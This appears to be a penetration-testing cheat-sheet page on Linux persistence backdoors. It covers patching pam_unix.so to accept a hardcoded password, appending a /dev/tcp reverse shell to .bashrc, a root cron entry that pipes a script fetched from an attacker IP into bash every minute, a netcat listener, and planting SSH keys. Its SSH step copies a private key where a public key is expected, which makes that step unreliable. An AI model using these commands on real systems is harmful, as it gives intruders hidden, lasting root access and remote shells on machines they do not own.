# 🚪 Backdoors

<figure><img src="../.gitbook/assets/door.gif" alt=""><figcaption></figcaption></figure>

{% hint style="info" %}
<mark style="color:blue;">A backdoor refers to</mark> <mark style="color:blue;"></mark><mark style="color:blue;">**any method**</mark> <mark style="color:blue;"></mark><mark style="color:blue;">by which</mark> <mark style="color:blue;"></mark><mark style="color:blue;">**authorized**</mark> <mark style="color:blue;"></mark><mark style="color:blue;">and</mark> <mark style="color:blue;"></mark><mark style="color:blue;">**unauthorized users**</mark> <mark style="color:blue;"></mark><mark style="color:blue;">are able to get around normal security measures and</mark> <mark style="color:blue;"></mark><mark style="color:blue;">**gain high level**</mark> <mark style="color:blue;"></mark><mark style="color:blue;">user access (aka root access) on a computer</mark> <mark style="color:blue;"></mark><mark style="color:blue;">**system**</mark><mark style="color:blue;">,</mark> <mark style="color:blue;"></mark><mark style="color:blue;">**network**</mark><mark style="color:blue;">, or</mark> <mark style="color:blue;"></mark><mark style="color:blue;">**software application**</mark><mark style="color:blue;">.</mark>&#x20;

<mark style="color:blue;">They are known for being</mark> <mark style="color:blue;"></mark><mark style="color:blue;">**discreet**</mark><mark style="color:blue;">. Backdoors exist for a select group of people in the know to</mark> <mark style="color:blue;"></mark><mark style="color:blue;">**gain easy access to a system or application**</mark><mark style="color:blue;">.</mark>
{% endhint %}

## | `PAM backdoor` |

{% hint style="info" %}
<mark style="color:blue;">This backdoor essentially consists of</mark> <mark style="color:blue;"></mark><mark style="color:blue;">**adding your own password**</mark> <mark style="color:blue;"></mark><mark style="color:blue;">to the</mark> <mark style="color:blue;"></mark><mark style="color:blue;">**pam\_unix.so**</mark> <mark style="color:blue;"></mark><mark style="color:blue;">file</mark>
{% endhint %}

_pam\_unix.so_ file is responsible for **authentication**

![](<../.gitbook/assets/image (10).png>)

_pam\_unix.so_ uses the unix\_verify\_password function to verify to user's supplied password **:**&#x20;

![we added a new line to our code : if (strcmp(p, "0xMitsurugi") != 0 )](<../.gitbook/assets/image (16).png>)

## | `.bashsrc backdoor` |

{% hint style="info" %}
<mark style="color:blue;">If a user has</mark> <mark style="color:blue;"></mark><mark style="color:blue;">**bash**</mark> <mark style="color:blue;"></mark><mark style="color:blue;">as their</mark> <mark style="color:blue;"></mark><mark style="color:blue;">**login shell**</mark><mark style="color:blue;">, the "</mark><mark style="color:blue;">**.bashrc**</mark><mark style="color:blue;">" file in their home directory is</mark> <mark style="color:blue;"></mark><mark style="color:blue;">**executed**</mark> <mark style="color:blue;"></mark><mark style="color:blue;">when an interactive session is launched.</mark>
{% endhint %}

Any user that log in often :&#x20;

```bash
echo 'bash -i >& /dev/tcp/ip/port 0>&1' >> ~/.bashrc
```

**Put a nc listener**

## | `CronJob backdoor` |

### With a root access

{% hint style="info" %}
_<mark style="color:blue;">cronjobs file -></mark> <mark style="color:blue;"></mark><mark style="color:blue;">**/etc/cronjob**</mark>_
{% endhint %}

Configure a task where every minute a reverse shell is sent to you. Add this line into our cronjob file :

```
* *     * * *   root    curl http://$attacker_ip:8080/shell | bash
```

Add this to the **shell** file :

```bash
#!/bin/bash
bash -i >& /dev/tcp/$ip/$port 0>&1
```

On the attacker machine :

```bash
nc -nvlp $port
```

## | `SSH Backdoor` |

{% hint style="info" %}
<mark style="color:blue;">Consists in</mark> <mark style="color:blue;"></mark><mark style="color:blue;">**saving**</mark> <mark style="color:blue;"></mark><mark style="color:blue;">our</mark> <mark style="color:blue;"></mark><mark style="color:blue;">**ssh keys**</mark> <mark style="color:blue;"></mark><mark style="color:blue;">in some</mark> <mark style="color:blue;"></mark><mark style="color:blue;">**user’s home**</mark> <mark style="color:blue;"></mark><mark style="color:blue;">directory. Then we can access it via ssh.</mark>
{% endhint %}

#### Generate ssh key

```bash
ssh-keygen
```

#### Copy our key into the user's .ssh directory

```bash
mkdir .ssh 
cp id_rsa .ssh/id_rsa
```
